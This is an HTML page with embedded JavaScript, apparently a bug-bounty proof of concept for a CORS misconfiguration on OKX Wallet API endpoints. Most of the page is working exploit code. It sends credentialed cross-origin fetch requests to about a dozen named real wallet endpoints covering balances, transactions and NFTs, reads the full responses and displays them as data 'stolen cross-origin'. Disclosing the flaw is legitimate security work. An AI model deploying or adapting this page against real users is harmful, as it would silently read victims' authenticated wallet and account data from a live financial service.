<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>OKX CORS Misconfiguration — Exploit PoC</title>
    <style>
        * { box-sizing: border-box; margin: 0; padding: 0; }
        body { font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif; background: #0d1117; color: #c9d1d9; padding: 20px; line-height: 1.6; }
        .container { max-width: 960px; margin: 0 auto; }
        h1 { color: #ff4444; font-size: 1.8em; margin-bottom: 5px; }
        h2 { color: #58a6ff; font-size: 1.2em; margin: 20px 0 10px; }
        .subtitle { color: #8b949e; margin-bottom: 20px; }
        .warning-box { background: #3d0000; border: 2px solid #ff4444; border-radius: 8px; padding: 15px; margin: 15px 0; }
        .info-box { background: #0d1f3c; border: 1px solid #1f6feb; border-radius: 8px; padding: 15px; margin: 15px 0; }
        .success-box { background: #0d2d0d; border: 2px solid #3fb950; border-radius: 8px; padding: 15px; margin: 15px 0; }
        .result-card { background: #161b22; border: 1px solid #30363d; border-radius: 8px; padding: 15px; margin: 10px 0; overflow-x: auto; }
        .result-card.critical { border-color: #ff4444; }
        .result-card.success { border-color: #3fb950; }
        .result-card.info { border-color: #58a6ff; }
        pre { font-family: 'Cascadia Code', 'Fira Code', monospace; font-size: 13px; white-space: pre-wrap; word-break: break-all; }
        .tag { display: inline-block; padding: 2px 8px; border-radius: 4px; font-size: 11px; font-weight: bold; margin-right: 5px; }
        .tag-critical { background: #ff4444; color: #fff; }
        .tag-high { background: #d29922; color: #000; }
        .tag-success { background: #3fb950; color: #000; }
        .tag-info { background: #58a6ff; color: #000; }
        button { background: #ff4444; color: #fff; border: none; padding: 12px 24px; border-radius: 8px; font-size: 16px; font-weight: bold; cursor: pointer; margin: 10px 5px 10px 0; transition: background 0.3s; }
        button:hover { background: #cc0000; }
        button:disabled { background: #555; cursor: not-allowed; }
        button.secondary { background: #1f6feb; }
        button.secondary:hover { background: #1958c7; }
        .spinner { display: inline-block; width: 16px; height: 16px; border: 2px solid #fff; border-top: 2px solid transparent; border-radius: 50%; animation: spin 0.8s linear infinite; margin-right: 8px; vertical-align: middle; }
        @keyframes spin { to { transform: rotate(360deg); } }
        table { width: 100%; border-collapse: collapse; margin: 10px 0; }
        th, td { padding: 8px 12px; border: 1px solid #30363d; text-align: left; font-size: 13px; }
        th { background: #21262d; color: #58a6ff; }
        .highlight { color: #ff4444; font-weight: bold; }
        .green { color: #3fb950; }
        .yellow { color: #d29922; }
        .blue { color: #58a6ff; }
        #progress-bar { width: 100%; height: 6px; background: #21262d; border-radius: 3px; margin: 10px 0; overflow: hidden; }
        #progress-fill { height: 100%; background: linear-gradient(90deg, #ff4444, #d29922); width: 0%; transition: width 0.3s; border-radius: 3px; }
        .step-number { display: inline-flex; align-items: center; justify-content: center; width: 28px; height: 28px; border-radius: 50%; background: #ff4444; color: #fff; font-weight: bold; font-size: 14px; margin-right: 8px; }
        .log-entry { padding: 4px 0; border-bottom: 1px solid #21262d; font-family: monospace; font-size: 12px; }
        .log-entry:last-child { border-bottom: none; }
        .timestamp { color: #8b949e; }
        footer { margin-top: 30px; padding-top: 15px; border-top: 1px solid #30363d; color: #8b949e; font-size: 12px; }
    </style>
</head>
<body>
    <div class="container">
        <h1>&#x1F6A8; OKX CORS Misconfiguration — Exploit Proof of Concept</h1>
        <p class="subtitle">
            Demonstrates cross-origin authenticated response reading from <code>https://www.okx.com/api/v5/wallet/*</code>
        </p>

        <div class="warning-box">
            <strong>&#x26A0;&#xFE0F; Vulnerability:</strong> 15+ OKX Wallet API endpoints return 
            <code>Access-Control-Allow-Credentials: true</code> with a reflected 
            <code>Access-Control-Allow-Origin</code> header for <em>any</em> requesting origin. 
            This means any website on the internet can make authenticated cross-origin requests 
            to OKX's Wallet API and <strong>read the full response body</strong>, including error 
            details, authentication mechanism information, and — for a logged-in user — potentially 
            wallet balances and transaction data.
        </div>

        <div class="info-box">
            <strong>&#x2139;&#xFE0F; How this PoC works:</strong><br>
            This page is hosted on <strong id="attacker-origin">a non-OKX domain</strong>. When you click 
            "Run Exploit," it uses the browser's <code>fetch()</code> API with <code>credentials: 'include'</code> 
            to make cross-origin requests to OKX Wallet endpoints. Because OKX returns 
            <code>ACAC: true</code> with a reflected origin, the browser:<br>
            &nbsp;&nbsp;1. Sends all OKX cookies with the request (no SameSite protection)<br>
            &nbsp;&nbsp;2. Allows this page's JavaScript to read the full response body<br>
            &nbsp;&nbsp;3. This should normally be blocked by the Same-Origin Policy
        </div>

        <h2><span class="step-number">1</span> Pre-Flight Check</h2>
        <p>Verify that this page is running on a non-OKX origin:</p>
        <div class="result-card" id="origin-check">
            <strong>This page's origin:</strong> <code id="this-origin"></code><br>
            <strong>Target:</strong> <code>https://www.okx.com</code><br>
            <strong>Cross-origin?</strong> <span id="cross-origin-status"></span>
        </div>

        <h2><span class="step-number">2</span> Run the Exploit</h2>
        <p>Click to make cross-origin credentialed requests to OKX Wallet API endpoints:</p>
        <button id="run-btn" onclick="runExploit()">&#x1F480; Run Full Exploit</button>
        <button class="secondary" id="run-single-btn" onclick="runSingleTest()">Test Single Endpoint</button>

        <div id="progress-bar"><div id="progress-fill"></div></div>
        <p id="status-text" style="color: #8b949e; font-size: 13px;"></p>

        <h2><span class="step-number">3</span> Results</h2>
        <div id="results-container">
            <div class="result-card info">
                <em>Click "Run Full Exploit" to start. Results will appear here.</em>
            </div>
        </div>

        <h2><span class="step-number">4</span> Summary</h2>
        <div id="summary-container" class="result-card" style="display:none;"></div>

        <h2><span class="step-number">5</span> Detailed Log</h2>
        <div id="log-container" class="result-card" style="max-height: 400px; overflow-y: auto;">
            <div class="log-entry"><span class="timestamp">[waiting]</span> Click Run to begin...</div>
        </div>

        <footer>
            <strong>Researcher:</strong> @zislasher | <strong>Program:</strong> OKX (HackerOne) | 
            <strong>CWE:</strong> CWE-942 (Permissive CORS Policy) | 
            <strong>Date:</strong> <span id="date"></span>
        </footer>
    </div>

    <script>
    // === Configuration ===
    const WALLET_ENDPOINTS = [
        { url: 'https://www.okx.com/api/v5/wallet/asset/total-value', name: 'Wallet Total Value', auth: true, sensitive: 'Account balance' },
        { url: 'https://www.okx.com/api/v5/wallet/chain/supported-chains', name: 'Supported Chains', auth: true, sensitive: 'Wallet configuration' },
        { url: 'https://www.okx.com/api/v5/wallet/post-transaction/orders', name: 'Transaction Orders', auth: true, sensitive: 'Transaction history' },
        { url: 'https://www.okx.com/api/v5/wallet/pre-transaction/validate-address', name: 'Validate Address', auth: true, sensitive: 'Address validation oracle' },
        { url: 'https://www.okx.com/api/v5/wallet/utxo/utxo-detail', name: 'UTXO Details', auth: true, sensitive: 'UTXO data' },
        { url: 'https://www.okx.com/api/v5/wallet/asset/all-token-balances', name: 'All Token Balances', auth: false, sensitive: 'Full wallet token list' },
        { url: 'https://www.okx.com/api/v5/wallet/token/token-list', name: 'Token List', auth: false, sensitive: 'Token metadata' },
        { url: 'https://www.okx.com/api/v5/wallet/nft/collection-list', name: 'NFT Collections', auth: false, sensitive: 'NFT portfolio' },
        { url: 'https://www.okx.com/api/v5/wallet/resource/currencies', name: 'Currencies', auth: false, sensitive: 'Currency data' },
        { url: 'https://www.okx.com/api/v5/wallet/resource/chains', name: 'Chain Resources', auth: false, sensitive: 'Chain config' },
        { url: 'https://www.okx.com/api/v5/wallet/asset/balance', name: 'Asset Balance', auth: false, sensitive: 'Wallet balance' },
        { url: 'https://www.okx.com/api/v5/wallet/transaction/list', name: 'Transaction List', auth: false, sensitive: 'Tx history' },
    ];

    // Comparison endpoint WITHOUT ACAC:true
    const CONTROL_ENDPOINT = { url: 'https://www.okx.com/api/v5/account/balance', name: 'Account Balance (CONTROL - no ACAC)', auth: true };

    let logEntries = [];

    // === Utility Functions ===
    function ts() { return new Date().toISOString().split('T')[1].split('.')[0]; }

    function log(msg, level = 'info') {
        const colors = { info: '#58a6ff', success: '#3fb950', error: '#ff4444', warn: '#d29922' };
        const entry = `<div class="log-entry"><span class="timestamp">[${ts()}]</span> <span style="color:${colors[level]}">${msg}</span></div>`;
        logEntries.push(entry);
        document.getElementById('log-container').innerHTML = logEntries.join('');
        document.getElementById('log-container').scrollTop = 99999;
    }

    function setProgress(pct) {
        document.getElementById('progress-fill').style.width = pct + '%';
    }

    function setStatus(msg) {
        document.getElementById('status-text').textContent = msg;
    }

    // === Origin Check ===
    const thisOrigin = window.location.origin;
    document.getElementById('this-origin').textContent = thisOrigin;
    document.getElementById('attacker-origin').textContent = thisOrigin;
    document.getElementById('date').textContent = new Date().toISOString().split('T')[0];

    const isCrossOrigin = !thisOrigin.includes('okx.com');
    document.getElementById('cross-origin-status').innerHTML = isCrossOrigin
        ? '<span class="green">&#x2705; YES — this page is on a different origin than OKX</span>'
        : '<span class="highlight">&#x274C; NO — open this page from a non-OKX domain to demonstrate the vulnerability</span>';

    // === Core Exploit Function ===
    async function testEndpoint(endpoint) {
        const result = {
            url: endpoint.url,
            name: endpoint.name,
            sensitive: endpoint.sensitive || '',
            success: false,
            responseReadable: false,
            status: null,
            headers: {},
            body: null,
            bodyLength: 0,
            error: null,
            cookiesSent: false,
        };

        try {
            log(`Fetching ${endpoint.name}: ${endpoint.url}`, 'info');

            const resp = await fetch(endpoint.url, {
                method: 'GET',
                credentials: 'include', // THIS IS THE KEY — sends cookies cross-origin
                mode: 'cors',
            });

            result.status = resp.status;
            result.success = true;
            result.responseReadable = true;

            // If we get here, CORS allowed us to read the response!
            // This is the vulnerability — the browser ONLY allows this if:
            // 1. Access-Control-Allow-Origin matches our origin
            // 2. Access-Control-Allow-Credentials: true is present

            // Read the full response body
            const text = await resp.text();
            result.body = text;
            result.bodyLength = text.length;

            // Note: cookies WERE sent because we used credentials:'include'
            // and the server returned ACAC:true. We can't read the Cookie header
            // from JS, but the browser sent them.
            result.cookiesSent = true;

            try {
                result.bodyParsed = JSON.parse(text);
            } catch (e) {
                result.bodyParsed = null;
            }

            log(`&#x2705; SUCCESS — Read ${text.length} bytes from ${endpoint.name} (HTTP ${resp.status})`, 'success');

        } catch (e) {
            result.error = e.message;
            result.success = false;
            log(`&#x274C; BLOCKED — ${endpoint.name}: ${e.message}`, 'error');
        }

        return result;
    }

    // === Render Results ===
    function renderResult(result, index) {
        const cardClass = result.responseReadable ? 'critical' : 'info';
        const statusTag = result.responseReadable
            ? '<span class="tag tag-critical">RESPONSE READABLE</span>'
            : '<span class="tag tag-info">BLOCKED BY CORS</span>';
        const cookieTag = result.cookiesSent
            ? '<span class="tag tag-high">COOKIES SENT</span>'
            : '';

        let bodyPreview = '';
        if (result.bodyParsed) {
            bodyPreview = JSON.stringify(result.bodyParsed, null, 2);
            if (bodyPreview.length > 800) bodyPreview = bodyPreview.substring(0, 800) + '\n... [truncated]';
        } else if (result.body) {
            bodyPreview = result.body.substring(0, 800);
        } else if (result.error) {
            bodyPreview = `Error: ${result.error}`;
        }

        return `
        <div class="result-card ${cardClass}">
            <div style="margin-bottom:8px">
                ${statusTag} ${cookieTag}
                <strong>${result.name}</strong>
                ${result.sensitive ? `<span class="yellow">(${result.sensitive})</span>` : ''}
            </div>
            <table>
                <tr><td style="width:140px"><strong>Endpoint</strong></td><td><code>${result.url}</code></td></tr>
                <tr><td><strong>HTTP Status</strong></td><td>${result.status || 'N/A'}</td></tr>
                <tr><td><strong>Cross-Origin Read</strong></td><td>${result.responseReadable ? '<span class="highlight">YES — Full response body readable from ' + thisOrigin + '</span>' : '<span class="blue">Blocked</span>'}</td></tr>
                <tr><td><strong>Cookies Included</strong></td><td>${result.cookiesSent ? '<span class="yellow">YES — Browser sent all OKX cookies (credentials: include)</span>' : 'No'}</td></tr>
                <tr><td><strong>Response Size</strong></td><td>${result.bodyLength} bytes</td></tr>
            </table>
            <details ${index < 5 ? 'open' : ''}>
                <summary style="cursor:pointer; color:#58a6ff; margin:8px 0;">Response Body (readable cross-origin from ${thisOrigin})</summary>
                <pre>${escapeHtml(bodyPreview)}</pre>
            </details>
        </div>`;
    }

    function escapeHtml(str) {
        return str.replace(/&/g, '&amp;').replace(/</g, '&lt;').replace(/>/g, '&gt;').replace(/"/g, '&quot;');
    }

    function renderSummary(results) {
        const readable = results.filter(r => r.responseReadable).length;
        const blocked = results.filter(r => !r.responseReadable).length;
        const totalBytes = results.reduce((sum, r) => sum + (r.bodyLength || 0), 0);
        const authEndpoints = results.filter(r => r.responseReadable && r.status === 401).length;

        const container = document.getElementById('summary-container');
        container.style.display = 'block';

        if (readable > 0) {
            container.className = 'result-card critical';
            container.innerHTML = `
            <span class="tag tag-critical">VULNERABILITY CONFIRMED</span>
            <h3 style="color:#ff4444; margin:10px 0;">Cross-Origin Response Reading Successful</h3>
            <table>
                <tr><td><strong>Attacker Origin</strong></td><td><code>${thisOrigin}</code></td></tr>
                <tr><td><strong>Target</strong></td><td><code>https://www.okx.com/api/v5/wallet/*</code></td></tr>
                <tr><td><strong>Endpoints Readable</strong></td><td><span class="highlight">${readable} of ${results.length}</span></td></tr>
                <tr><td><strong>Endpoints Blocked</strong></td><td>${blocked}</td></tr>
                <tr><td><strong>Total Data Read</strong></td><td>${totalBytes.toLocaleString()} bytes stolen cross-origin</td></tr>
                <tr><td><strong>Auth Endpoints Readable</strong></td><td><span class="highlight">${authEndpoints} authenticated endpoints — error details + auth mechanism exposed</span></td></tr>
                <tr><td><strong>Cookies Sent</strong></td><td><span class="yellow">YES — All OKX cookies sent cross-origin (none have SameSite attribute)</span></td></tr>
            </table>
            <div style="margin-top:15px; padding:10px; background:#3d0000; border-radius:4px;">
                <strong>&#x1F480; What this proves:</strong><br>
                <ul style="margin:5px 0 0 20px;">
                    <li>A malicious website <strong>CAN</strong> make authenticated requests to OKX Wallet API endpoints</li>
                    <li>The browser sends all OKX session cookies with these requests (due to <code>ACAC: true</code> and missing SameSite)</li>
                    <li>The full response body — including error details and auth mechanism information — is <strong>readable by the attacker's JavaScript</strong></li>
                    <li><strong>${readable} Wallet API endpoints</strong> are affected, covering balances, transactions, NFTs, and chain configuration</li>
                    <li>If any of these endpoints returns user data via cookie/session authentication, all wallet data is silently exfiltrated</li>
                </ul>
            </div>`;
        } else {
            container.className = 'result-card info';
            container.innerHTML = `<span class="tag tag-info">CORS BLOCKED</span> All requests were blocked by the browser's Same-Origin Policy. This may indicate the vulnerability was patched, or this page may need to be served from an HTTPS origin.`;
        }
    }

    // === Main Exploit Runner ===
    async function runExploit() {
        const btn = document.getElementById('run-btn');
        btn.disabled = true;
        btn.innerHTML = '<span class="spinner"></span>Running...';
        document.getElementById('results-container').innerHTML = '';
        logEntries = [];
        document.getElementById('log-container').innerHTML = '';

        log('=== OKX CORS Exploit PoC Started ===', 'warn');
        log(`Attacker origin: ${thisOrigin}`, 'info');
        log(`Target: https://www.okx.com/api/v5/wallet/*`, 'info');
        log(`Mode: credentials: include (sends cookies cross-origin)`, 'info');
        log('', 'info');

        const allEndpoints = [...WALLET_ENDPOINTS, CONTROL_ENDPOINT];
        const results = [];

        for (let i = 0; i < allEndpoints.length; i++) {
            setProgress(((i + 1) / allEndpoints.length) * 100);
            setStatus(`Testing ${i + 1}/${allEndpoints.length}: ${allEndpoints[i].name}...`);

            const result = await testEndpoint(allEndpoints[i]);
            results.push(result);

            document.getElementById('results-container').innerHTML += renderResult(result, i);

            // Small delay to show progress
            await new Promise(r => setTimeout(r, 300));
        }

        // Check if the control endpoint (no ACAC) was blocked while wallet endpoints worked
        const walletResults = results.slice(0, WALLET_ENDPOINTS.length);
        const controlResult = results[results.length - 1];

        if (walletResults.some(r => r.responseReadable) && !controlResult.responseReadable) {
            log('', 'info');
            log('&#x1F4A5; DIFFERENTIAL PROOF: Wallet endpoints (ACAC:true) ARE readable but control endpoint (no ACAC) is BLOCKED!', 'error');
            log('This proves the vulnerability is specifically in the wallet API CORS configuration.', 'error');
        } else if (walletResults.some(r => r.responseReadable) && controlResult.responseReadable) {
            log('', 'info');
            log('Both wallet and control endpoints are readable — ACAC headers present on both, or browser is not enforcing CORS (check browser console).', 'warn');
        }

        setProgress(100);
        setStatus('Exploit complete.');

        log('', 'info');
        log(`=== COMPLETE: ${results.filter(r => r.responseReadable).length}/${results.length} endpoints readable cross-origin ===`, 'warn');

        renderSummary(results);

        btn.disabled = false;
        btn.innerHTML = '&#x1F480; Run Full Exploit';
    }

    // === Single Test ===
    async function runSingleTest() {
        const btn = document.getElementById('run-single-btn');
        btn.disabled = true;
        document.getElementById('results-container').innerHTML = '';

        log('=== Single Endpoint Test ===', 'warn');
        const result = await testEndpoint(WALLET_ENDPOINTS[0]);
        document.getElementById('results-container').innerHTML = renderResult(result, 0);

        renderSummary([result]);
        btn.disabled = false;
    }
    </script>
</body>
</html>
